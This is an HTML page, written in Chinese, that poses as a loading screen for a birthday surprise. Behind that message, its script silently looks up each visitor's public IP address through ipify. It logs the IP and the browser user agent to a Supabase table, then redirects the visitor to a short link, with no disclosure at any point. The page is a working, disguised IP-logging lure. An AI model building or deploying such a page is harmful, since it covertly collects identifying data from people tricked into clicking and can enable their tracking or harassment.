<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>正在为您准备惊喜...</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: sans-serif;
            margin: 0;
        }
        .loader {
            border: 3px solid #333;
            border-top: 3px solid #ff00de;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>正在为您打开生日惊喜，请稍候...</p>

    <script>
                // --- 2. 配置你的 Supabase 凭证 ---
        const SUPABASE_URL = 'https://qxgwhtxwogstsjnuoacq.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_VZixI6Z49NvH3O-zU-zcOw_LVgWhQgA';
        
        // 注意这里：我们将实例重命名为 _supabase
        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // 跳转的目标地址
        const targetUrl = "https://3bbj.cn/46277";

        async function recordAndRedirect() {
            try {
                // 第一步：尝试获取 IP
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2000);

                const ipResponse = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                const ipData = await ipResponse.json();
                const userIp = ipData.ip;
                clearTimeout(timeoutId);

                // 第二步：将信息写入 Supabase (这里也要用 _supabase)
                await _supabase.from('view_logs').insert([
                    { 
                        ip_address: userIp, 
                        user_agent: navigator.userAgent 
                    }
                ]);
                console.log("记录成功");

            } catch (err) {
                console.error("记录失败，但将继续跳转:", err);
            } finally {
                // 第三步：跳转
                window.location.href = targetUrl;
            }
        }

        window.onload = recordAndRedirect;

        setTimeout(() => {
            window.location.href = targetUrl;
        }, 5000);

    </script>
</body>
</html>
